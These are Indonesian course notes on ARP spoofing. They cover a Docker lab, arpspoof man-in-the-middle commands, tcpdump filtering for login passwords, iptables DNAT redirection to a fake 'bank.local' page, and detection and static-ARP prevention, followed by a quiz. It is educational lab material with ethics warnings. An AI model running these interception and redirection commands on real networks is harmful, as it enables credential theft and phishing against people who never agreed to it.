# Pertemuan 3 — L2 Security: ARP Spoofing

Catatan ini aku susun dari materi dosen di `Network-Security-Course-Bank/Pertemuan3.md` (judul asli: "Materi Lengkap Pertemuan 3: L2 Security - ARP Spoofing"). Isinya: cara kerja ARP, kenapa ARP spoofing bisa, hands-on `arpspoof` + sniffing password, DNS spoofing lokal, sampai deteksi & pencegahan.

## Apa Itu ARP?

**ARP (Address Resolution Protocol)** adalah protokol buat memetakan alamat IP (layer 3) ke alamat MAC (layer 2) di jaringan lokal.

Analogi dari materi:
- **IP Address** = nama orang (siapa yang dituju)
- **MAC Address** = alamat rumah (di mana orang itu tinggal)
- **ARP** = buku alamat yang menghubungkan nama orang dengan alamat rumahnya

### Cara kerja ARP normal

1. Komputer A mau kirim ke `172.20.0.20` tapi nggak tahu MAC-nya → broadcast **ARP Request**: "Siapa yang punya IP 172.20.0.20?"
2. Komputer B mendengar dan membalas **ARP Reply (unicast)**: "Saya! MAC saya AA:BB:CC:DD:EE:FF"
3. A menyimpan hasilnya di ARP table: `172.20.0.20 = AA:BB:CC:DD:EE:FF`

### ARP Table

```bash
ip neigh show          # atau
arp -n

# Contoh:
172.20.0.1 dev eth0 lladdr 02:42:ac:14:00:01 REACHABLE
172.20.0.20 dev eth0 lladdr 02:42:ac:14:00:14 STALE
```

## ARP Spoofing / ARP Poisoning

**ARP Spoofing** = teknik di mana penyerang mengirim pesan ARP palsu ke jaringan, sehingga IP korban dipetakan ke MAC penyerang.

### Kenapa ARP rentan?

- **Tidak ada autentikasi** — ARP nggak memverifikasi apakah pesan itu asli.
- **Stateless** — setiap perangkat menerima ARP reply meski nggak pernah minta.
- **Cache poisoning** — perangkat akan memperbarui ARP table-nya dengan info baru.

Setelah spoofing berhasil, traffic korban lewat penyerang (Man-in-the-Middle). Yang bisa dilakukan penyerang:

1. **Man-in-the-Middle (MITM)** — menyadap semua komunikasi.
2. **Password Sniffing** — menangkap password yang dikirim.
3. **DNS Spoofing** — mengarahkan korban ke website palsu.

## Setup Lab dengan Docker Compose

Topologi (network `172.20.0.0/16`):

| Container | IP | Peran |
|---|---|---|
| `korban` (ubuntu:22.04) | 172.20.0.10 | Korban |
| `web-asli` (nginx:alpine) | 172.20.0.20 | Website asli (host port 8080) |
| `web-palsu` (nginx:alpine) | 172.20.0.30 | Website palsu (host port 8081) |
| `penyerang` (kalilinux/kali-rolling) | 172.20.0.100 | Penyerang (dsniff, tcpdump) |

```bash
mkdir -p lab-arp && cd lab-arp
# taruh docker-compose.yml + folder web-asli/ dan web-palsu/ berisi index.html
docker-compose up -d
sleep 30
docker-compose ps          # semua harus "Up"

docker exec korban ping -c 2 172.20.0.20
# Web asli: http://localhost:8080 | Web palsu: http://localhost:8081
```

> [!IMPORTANT]
> Container penyerang di compose-nya dikasih `cap_add: NET_ADMIN, NET_RAW` + `privileged: true`, dan langsung menyalakan IP forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`). Dua hal ini wajib: tanpa forwarding, traffic korban nggak diteruskan dan koneksi putus (korban sadar ada yang salah).

## Hands-On: ARP Spoofing dengan `arpspoof`

### Langkah 1 — catat kondisi normal (di korban)

```bash
arp -n
MAC_ASLI=$(arp -n | grep 172.20.0.20 | awk '{print $3}')
echo "MAC ASLI Web: $MAC_ASLI"
curl http://172.20.0.20
```

### Langkah 2 — mulai serangan (di penyerang)

```bash
# Aktifkan IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bohongi korban
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20

# Terminal penyerang BARU: bohongi server juga (dua arah)
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10

# Terminal penyerang BARU: sniff password
tcpdump -i eth0 -A -l port 80 | grep -E "user=|pass="
```

### Langkah 3 — buktikan serangan (di korban)

```bash
arp -n | grep 172.20.0.20     # MAC sekarang = MAC penyerang!

curl -X POST http://172.20.0.20/login -d "user=andi&pass=rahasia123"
```

Di terminal sniffing akan muncul:

```
user=andi&pass=rahasia123
```

> [!WARN]
> Password nggak terenkripsi karena dikirim lewat HTTP. Ini nyambung ke Pertemuan 2 — kalau password dikirim di atas TLS, isi yang disadap cuma ciphertext. ARP spoofing berhasil dapat traffic, tapi WHOIS-nya nggak otomatis dapat plaintext kalau protokol di atasnya terenkripsi.

## Hands-On: DNS Spoofing dengan Web Lokal

```bash
# Di korban
apt update && apt install -y dnsutils

# Di penyerang: hosts palsu + redirect semua HTTP ke web palsu
cat > /tmp/hosts.palsu << 'EOF'
172.20.0.30 bank.local
172.20.0.30 www.bank.local
EOF

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 172.20.0.30
arpspoof -i eth0 -t 172.20.0.10 172.20.0.254 &

# Di korban:
curl http://bank.local     # muncul website PALSU (background merah)
```

## Deteksi dan Pencegahan

### Deteksi sederhana (di korban)

Script monitoring yang bandingkan MAC sekarang vs MAC asli:

```bash
#!/bin/bash
REAL_MAC="02:42:ac:14:00:14"   # ganti dengan MAC asli
while true; do
    clear
    CURRENT=$(arp -n | grep 172.20.0.20 | awk '{print $3}')
    echo "MAC Sekarang: $CURRENT"
    echo "MAC Seharusnya: $REAL_MAC"
    [ "$CURRENT" != "$REAL_MAC" ] && echo "⚠️ TERDETEKSI ARP SPOOFING!"
    sleep 2
done
```

### Pencegahan dengan static ARP

```bash
arp -s 172.20.0.20 02:42:ac:14:00:14   # tambah static ARP (nggak bisa di-poison)
arp -n | grep 172.20.0.20              # akan ada flag PERMANENT
```

> [!TIP]
> Catatan tambahan (bukan dari materi dosen): di jaringan produksi, mitigasi standarnya pakai **Dynamic ARP Inspection (DAI)** di switch managed + port security, bukan static ARP manual yang nggak scalable. Materi Cuma ngenalin static ARP sebagai demo konsep.

## Ringkasan Perintah Penting

| Fungsi | Perintah |
|---|---|
| Start lab | `docker-compose up -d` |
| Masuk penyerang | `docker exec -it penyerang bash` |
| Lihat ARP | `arp -n` |
| Spoof korban | `arpspoof -i eth0 -t 172.20.0.10 172.20.0.20` |
| Spoof server | `arpspoof -i eth0 -t 172.20.0.20 172.20.0.10` |
| IP forward | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
| Sniff HTTP | `tcpdump -i eth0 -A port 80` |
| Sniff password | `tcpdump -i eth0 -A -l port 80 \| grep -E "user\|pass"` |
| Static ARP | `arp -s 172.20.0.20 02:42:ac:14:00:14` |
| Reset ARP | `ip neigh flush all` |
| Matikan serangan | `killall arpspoof` |

Bersih-bersih setelah praktik:

```bash
killall arpspoof
echo 0 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
ip neigh flush all
```

> [!WARN]
> Materi ini tegas soal etika: praktik HANYA di lab sendiri, jangan di jaringan orang lain, selalu jalankan cleanup, dan **catat MAC asli sebelum serangan** supaya bisa deteksi.

```quiz
Q: ARP berfungsi memetakan...
+ Alamat IP ke alamat MAC
- Alamat MAC ke nomor port
- Nama domain ke alamat IP
> ARP = IP (L3) → MAC (L2). Nama domain → IP itu tugas DNS.

Q: Kenapa ARP mudah diserang?
+ Tidak ada autentikasi dan bersifat stateless (menerima reply tanpa diminta)
- Karena ARP terenkripsi dengan kunci lemah
- Karena ARP hanya jalan di IPv6
> ARP nggak punya mekanisme verifikasi; siapapun bisa kirim ARP reply dan cache langsung diperbarui.

Q: Yang terjadi pada ARP table korban saat ARP spoofing berhasil?
+ MAC untuk IP target berubah menjadi MAC penyerang
- IP korban berubah menjadi IP gateway
- ARP table korban otomatis dikosongkan
> Penyerang memetakan IP korban ke MAC-nya sendiri, sehingga traffic korban lewat penyerang.

Q: Perintah untuk mengaktifkan IP forwarding di penyerang adalah...
+ echo 1 > /proc/sys/net/ipv4/ip_forward
- arpspoof -i eth0 -t 172.20.0.10 172.20.0.20
- arp -s 172.20.0.20 02:42:ac:14:00:14
> IP forwarding wajib supaya paket tetap diteruskan ke tujuan (biar korban nggak sadar koneksi putus).

Q: Sniff password di traffic HTTP port 80 yang tepat adalah...
+ tcpdump -i eth0 -A -l port 80 | grep -E "user=|pass="
- nmap -sV port 80
- arp -n | grep 172.20.0.20
> `-A` menampilkan isi paket dalam ASCII, `-l` line-buffered, lalu difilter pola form login.

Q: Untuk spoofing dua arah (MITM penuh), penyerang perlu...
+ Menjalankan arpspoof ke korban DAN ke server
- Cukup satu arpspoof ke korban saja
- Mematikan IP forwarding
> Dua arah diperlukan agar traffic korban→server dan server→korban sama-sama lewat penyerang.

Q: Pencegahan ARP spoofing dengan static ARP dilakukan pakai perintah...
+ arp -s 172.20.0.20 02:42:ac:14:00:14
- ip neigh flush all
- killall arpspoof
> `arp -s` menambah entri ARP permanen sehingga nggak bisa di-poison; flag PERMANENT muncul di `arp -n`.

Q: Kenapa penyerang bisa dapat password dari korban di lab ini?
+ Karena formulir login dikirim lewat HTTP tanpa enkripsi
- Karena ARP spoofing otomatis mendekripsi HTTPS
- Karena password disimpan di file hosts
> ARP spoofing cuma mengalihkan traffic; plaintext terlihat karena protokolnya HTTP.

Q: Alur DNS spoofing lokal di materi memakai iptables untuk...
+ DNAT semua traffic TCP port 80 ke web palsu 172.20.0.30
- Memblokir port 53 agar DNS gagal
- Mengubah MAC address korban
> Rule `PREROUTING ... --dport 80 -j DNAT --to-destination 172.20.0.30` mengarahkan HTTP ke server palsu.

Q: Langkah pertama yang harus dilakukan SEBELUM serangan untuk keperluan deteksi adalah...
+ Mencatat MAC asli target
- Menghapus ARP table
- Mematikan gateway
> Tanpa MAC asli sebagai pembanding, script deteksi nggak bisa tahu MAC-nya sudah berubah.
```